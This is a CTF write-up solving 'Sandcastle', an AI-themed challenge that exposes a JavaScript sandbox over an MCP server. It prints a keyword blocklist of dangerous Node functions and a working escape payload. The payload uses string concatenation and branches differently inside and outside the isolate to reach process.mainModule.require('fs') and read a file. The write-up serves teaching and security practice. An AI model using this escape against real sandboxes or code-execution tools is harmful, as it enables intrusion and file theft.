
# Sandcastle

 * Category: AI
 * Solved by the JCTF Team

## Description

> Oh no! LLMs have arrived at Bikini Bottom and chaos has erupted. Patrick Star, newly obsessed with vibe coding, got his hands on Spongebob’s Claude subscription and decided to “refactor” everything – even things that were already working!
> 
>     “They should be better,” Patrick insisted, as he rewrote stable systems into spaghetti code.
> 
> To save Bikini Bottom from this well-meaning disaster, Sandy created a clever distraction: Sandcastle – the ultimate sandbox environment where Patrick could code endlessly without breaking anything real.
> 
> With a few prompts and a sprinkle of Texan ingenuity, Sandy wired up Claude into the sandbox and handed Patrick the keys.
> 
> Now Patrick is stuck coding inside Sandcastle, unaware that it’s all a trick.
> 
>     PATRICK: “HALPPPP SPONGEBOB, THE SAND IS EATING ME!”
> 
> Can you step into this bizarre sandbox and uncover what Sandy buried in there?

A link to an MCP server was attached.

## Solution

Let's start by exploring the MCP server content:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/sandcastle]
└─$ curl https://sandcastle.appsecil.ctf.today/mcp -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" --data '{"jsonrpc":"2.0","method":"tools/list","id":1}'
event: message
data: {"result":{"tools":[{"name":"getFile","description":"Read and return the contents of a file from the allowed directory with security restrictions","inputSchema":{"type":"object","properties":{"filename":{"type":"string"}},"required":["filename"],"additionalProperties":false,"$schema":"http://json-schema.org/draft-07/schema#"}},{"name":"execute","description":"Execute javascript code in a secure sandbox environment and return the output or result","inputSchema":{"type":"object","properties":{"code":{"type":"string"}},"required":["code"],"additionalProperties":false,"$schema":"http://json-schema.org/draft-07/schema#"}}]},"jsonrpc":"2.0","id":1}

┌──(user@kali3)-[/media/sf_CTFs/appsec/sandcastle]
└─$ curl https://sandcastle.appsecil.ctf.today/mcp -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" --data '{"jsonrpc":"2.0","method":"resources/list","id":1}'
event: message
data: {"result":{"resources":[{"uri":"listfiles://app","name":"listFiles"}]},"jsonrpc":"2.0","id":1}

┌──(user@kali3)-[/media/sf_CTFs/appsec/sandcastle]
└─$ curl https://sandcastle.appsecil.ctf.today/mcp -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" --data '{"jsonrpc":"2.0","method":"resources/read","params":{ "uri": "listfiles://app"}, "id":1}'
event: message
data: {"result":{"contents":[{"uri":"listfiles://app","text":"[\"code/executor.js\",\"code/validator.js\",\"code/workers/codeExecutorWorker.js\",\"package-lock.json\",\"package.json\",\"server.js\"]"}]},"jsonrpc":"2.0","id":1}
```

Once we have the file names, we can read them one-by-one, e.g.:
```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/sandcastle]
└─$ curl https://sandcastle.appsecil.ctf.today/mcp -H "Content-Type: application/json" -H "Accept: application/json, text/event-stream" --data '{"jsonrpc": "2.0", "method": "tools/call", "params": { "name": "getFile", "arguments": {"filename": "code/executor.js"}}, "id": 2}'
event: message
data: {"result":{"content":[{"type":"text","text":"const { Worker } = require('worker_threads');\nconst path = require('path');\nconst CodeValidator = require('./validator');\n\nclass CodeExecutor {\n    static async execute(code) {\n        try {\n            await CodeValidator.validateInSandbox(code);\n            return await this.runCodeInWorker(code, 1000);\n        } catch (error) {\n            throw new Error('Invalid code');\n        }\n    }\n\n    static runCodeInWorker(payload, timeout) {\n        return new Promise((resolve, reject) => {\n            const worker = new Worker(path.join(__dirname, 'workers', 'codeExecutorWorker.js'));\n            let hasResult = false;\n\n            worker.on('message', (response) => {\n                hasResult = true;\n                if (response.error) {\n                    reject(new Error('Execution failed'));\n                } else {\n                    resolve(response.result);\n                }\n            });\n            \n            worker.on('error', () => {\n                reject(new Error('Worker failed'));\n            });\n\n            worker.on('exit', (code) => {\n                if (!hasResult) {\n                    reject(new Error('Worker stopped'));\n                }\n            });\n\n            const timeoutId = setTimeout(() => {\n                worker.terminate();\n                reject(new Error('Timeout'));\n            }, timeout);\n\n            worker.postMessage({ payload });\n\n            worker.on('message', () => {\n                clearTimeout(timeoutId);\n            });\n        });\n    }\n}\n\nmodule.exports = CodeExecutor;"}]},"jsonrpc":"2.0","id":2}
```

The application is quite long, these are the relevant parts:

```javascript
//
// From executor.js:
//
    static async execute(code) {
        try {
            await CodeValidator.validateInSandbox(code);
            return await this.runCodeInWorker(code, 1000);
        } catch (error) {
            throw new Error('Invalid code');
        }
    }

// 
// From validator.js:
//

const ivm = require("isolated-vm");

const MAX_CODE_LENGTH = 1024 * 10; // 10KB
const MAX_MEMORY = 8; // 8MB
const TIMEOUT = 1000; // 1 second

const forbidden = [
    'require',
    'global',
    'globalThis',
    'process',
    'fs',
    'child_process',
    'exec',
    'spawn',
    'execSync',
    'eval',
    'Function',
    'setTimeout',
    'setInterval',
    'setImmediate',
    'Buffer',
    'console',
    'log',
    'error',
    'warn',
    'info',
    'debug',
    'trace',
    'module',
    'exports',
    '__dirname',
    '__filename',
    '_load',
    'mainModule'
];

class CodeValidator {
    static isMalicious(code) {
        if (code.length > MAX_CODE_LENGTH) {
            throw new Error(`Code too long: ${code.length} bytes`);
        }

        const lowerCode = code.toLowerCase();
        
        for (const term of forbidden) {
            const pattern = new RegExp(`\\b${term}\\b`);
            if (pattern.test(lowerCode)) {
                return true;
            }
        }

        return false;
    }

    static async validateInSandbox(code) {
        let isolate = null;
        let context = null;

        try {
            if (this.isMalicious(code)) {
                throw new Error("Code contains potentially dangerous patterns");
            }

            isolate = new ivm.Isolate({ 
                memoryLimit: MAX_MEMORY,
                inspector: false
            });

            context = await isolate.createContext();
            const jail = context.global;

            for (const name of forbidden) {
                await jail.set(name, undefined);
            }

            await context.eval(`
                'use strict';
                [
                    Object, Array, Function, Error,
                    RegExp, Promise, Date, Map, Set,
                    String, Number, Boolean, Symbol
                ].forEach(C => {
                    if (C && typeof C === 'function') {
                        Object.freeze(Object.getPrototypeOf(C));
                        Object.freeze(C);
                    }
                });
            `);
            
            const wrapped = `'use strict';\n${code}`;
            const script = await isolate.compileScript(wrapped);
            
            const result = await script.run(context, {
                timeout: TIMEOUT,
                copy: true
            });

            return result;
        } catch (error) {
            if (error.message.includes('timeout')) {
                throw new Error('Code execution timed out');
            }
            throw new Error(`Code validation failed: ${error.message}`);
        } finally {
            if (context) {
                context.release();
            }
            if (isolate) {
                isolate.dispose();
            }
        }
    }
}

module.exports = CodeValidator;

//
// From codeExecutorWorker.js:
//
class CodeRunner {
    static execute(code) {
        try {
            const wrappedCode = `return (${code})`;
            const fn = new Function(wrappedCode);
            const result = fn();
            
            if (!Number.isInteger(result) && result.length === undefined) {
                return "No output";
            }
            
            if (typeof result === 'object') {
                return JSON.stringify(result);
            }
            
            return result.toString();
        } catch (error) {
            throw new Error('Invalid code');
        }
    }
}

```

In short, the application allows us to execute code, but only if we pass the validation.
This validation is composed of running in a VM which includes:
 * A blacklist of case-insensitive keywords that are considered dangerous
 * Limitations on execution time, memory and length
 * The removal of access to dangerous globals by setting them to `undefined`
 * Freezing prototype chains of common constructors to prevent prototype pollution or global state mutation

The following script will send a payload that bypasses the sanitization checks (by behaving differently
inside/outside the VM and using string concatenation to bypass the blacklist):

```python
import requests
import json

url = "https://sandcastle.appsecil.ctf.today/mcp"
headers = {
    "Content-Type": "application/json",
    "Accept": "application/json, text/event-stream"
}

code = """this["p" + "rocess"] === undefined ? 1 : this["p" + "rocess"]["m"+"ainModule"]["r"+"equire"]("f"+"s").readFileSync("/flag")"""

payload = {
    "jsonrpc": "2.0",
    "method": "tools/call",
    "params": {
        "name": "execute",
        "arguments": {
            "code": code
        }
    },
  "id": 1
}
resp = requests.post(url, headers=headers, json=payload)
print(resp.text)

j = json.loads(resp.text.replace("event: message\ndata: ", ""))
j = json.loads(j["result"]["content"][0]["text"])
print("Flag: ", "".join(chr(x) for x in j["data"]))
```

Output:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/sandcastle]
└─$ python3 solve.py
event: message
data: {"result":{"content":[{"type":"text","text":"{\"type\":\"Buffer\",\"data\":[65,112,112,83,101,99,45,73,76,123,68,51,98,117,57,57,49,110,57,95,49,53,95,55,104,51,95,119,64,121,125]}"}]},"jsonrpc":"2.0","id":1}


Flag:  AppSec-IL{D3bu991n9_15_7h3_w@y}
```

